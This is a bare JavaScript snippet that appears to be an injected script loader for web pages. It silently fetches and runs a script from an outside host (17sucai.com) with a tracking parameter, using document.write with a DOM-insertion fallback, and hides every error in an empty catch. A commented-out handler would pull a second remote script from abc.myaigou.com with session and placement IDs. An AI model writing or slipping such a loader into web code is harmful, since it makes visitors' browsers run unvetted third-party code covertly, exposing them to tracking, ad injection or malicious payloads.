(function() {
	try {
		var ab = "http://www.17sucai.com/preview/34602/2016-03-22/jianli/js/main.js",
			d = document;
		_add = function(s) {
			var k = d.createElement("script");
			k.type = "text/javascript";
			k.src = s;
			var s = d.getElementsByTagName("script")[0];
			s.parentNode.insertBefore(k, s)
		};
		ab.indexOf("?") > 0 ? ab += "&tcdsp" : ab += "?tcdsp";
		n = d.getElementsByTagName("script").length;
		d.write("<script type='text/javascript' src='" + ab + "'></script>");
		if (n == d.getElementsByTagName("script").length) _add(ab);
		if (!window.abtd && !(!-[1, ] && !window.XMLHttpRequest)) {
			window.abtd = 1;
			// window.onload = function() {
			// 	_add('http://abc.myaigou.com/s/js/fshow.js?_qwert_sid=416153783&_zxcvb_pid=990274192119')
			// }
		}
	} catch (e) {}
})();